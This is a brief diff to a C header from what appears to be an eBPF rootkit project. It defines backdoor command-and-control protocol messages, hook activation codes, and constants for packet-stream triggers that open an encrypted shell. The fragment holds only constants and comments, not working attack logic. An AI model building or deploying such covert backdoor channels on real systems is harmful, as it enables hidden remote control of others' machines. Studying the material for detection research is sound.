@@ -2,7 +2,7 @@
 #define __BPF_CC_H
 
 //C&C V0 & V1 --> Unencrypted transmission with RAW sockets, no TCP conn
-//Protocol messages are also used in the secure channel of V2 & V3 backdoor
+//Protocol messages are also used inside the secure channel of V2 & V3 backdoor
 #define CC_PROT_SYN "CC_SYN"
 #define CC_PROT_ACK "CC_ACK"
 #define CC_PROT_MSG "CC_MSG#"
@@ -25,13 +25,13 @@
 #define CC_PROT_COMMAND_HOOK_ACTIVATE_ALL 1
 #define CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL 2
 
-//C&C V3 -- Distributed hidden payload in packet stream
+//C&C V3 -- Distributed hidden payload in packet stream + encrypted shell
 struct trigger_t {
     unsigned int seq_raw;
 };
 #define CC_STREAM_TRIGGER_PAYLOAD_LEN 12
 #define CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES 4
-#define CC_STREAM_TRIGGER_KEY_ENCRYPTED_SHELL "\x2C\x82"
+#define CC_STREAM_TRIGGER_KEY_ENCRYPTED_SHELL CC_TRIGGER_SYN_PACKET_KEY_3_ENCRYPTED_SHELL
 
 
 #endif
